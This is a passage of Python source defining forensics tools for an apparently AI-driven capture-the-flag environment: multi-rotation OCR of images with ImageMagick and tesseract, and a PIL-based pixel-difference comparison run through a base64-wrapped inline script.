        return _result_text(await env.exec(command, timeout=600))

    return pcap_tls_recover


@register_tool(name="image_ocr", groups=["misc", "forensics"])
def make_image_ocr(*, env: CTFEnvironment, **_) -> object:
    from langchain_core.tools import tool

    @tool
    async def image_ocr(image: str, output_dir: str = "/ctf/ocr_variants") -> str:
        """OCR an image across rotations and grayscale thresholds."""
        source = shlex.quote(image)
        destination = shlex.quote(output_dir)
        command = (
            f"test -f {source} || {{ echo '[error] image not found' >&2; exit 2; }}; "
            f"rm -rf -- {destination}; mkdir -p -- {destination}; "
            "for rotation in 0 90 180 270; do "
            f"convert {source} -rotate \"$rotation\" -resize '250%' "
            f"{destination}/r-$rotation.png; "
            "for threshold in 35 50 65; do "
            f"convert {destination}/r-$rotation.png -colorspace Gray "
            f"-threshold \"$threshold%\" {destination}/r-$rotation-t-$threshold.png; "
            "done; done; "
            f"for candidate in {destination}/*.png; do "
            "echo \"[ocr:$candidate]\"; tesseract \"$candidate\" stdout 2>/dev/null | head -80; "
            "done"
        )
        return _result_text(await env.exec(command, timeout=300))

    return image_ocr


@register_tool(name="image_compare", groups=["misc", "forensics"])
def make_image_compare(*, env: CTFEnvironment, **_) -> object:
    from langchain_core.tools import tool

    program = r'''import json
import pathlib
import sys
from PIL import Image, ImageChops, ImageEnhance

left_path, right_path, output = sys.argv[1:]
left = Image.open(left_path).convert("RGBA")
right = Image.open(right_path).convert("RGBA")
if left.size != right.size:
    print(json.dumps({"left_size": left.size, "right_size": right.size,
                      "comparable": False}))
    raise SystemExit(3)
diff = ImageChops.difference(left, right)
gray = diff.convert("L")
bbox = gray.getbbox()
histogram = gray.histogram()
changed_pixels = sum(histogram[1:])
root = pathlib.Path(output)
root.mkdir(parents=True, exist_ok=True)
diff_path = root / "difference-enhanced.png"
mask_path = root / "difference-mask.png"
ImageEnhance.Contrast(diff).enhance(8).save(diff_path)
gray.point(lambda value: 255 if value else 0).save(mask_path)
print(json.dumps({"left_size": left.size, "right_size": right.size,
                  "comparable": True, "difference_bbox": bbox,
                  "changed_pixels": changed_pixels,
                  "total_pixels": left.width * left.height,
                  "difference_image": diff_path.as_posix(),
                  "mask_image": mask_path.as_posix()}, indent=2))
'''

    @tool
    async def image_compare(
        left: str, right: str, output_dir: str = "/ctf/image_difference"
    ) -> str:
        """Compare two same-sized images and emit enhanced difference artifacts."""
        encoded = base64.b64encode(program.encode()).decode()
        command = (
            f"python3 -c \"import base64;exec(base64.b64decode('{encoded}'))\" "
            f"{shlex.quote(left)} {shlex.quote(right)} {shlex.quote(output_dir)}"
        )
        return _result_text(await env.exec(command, timeout=180))

    return image_compare
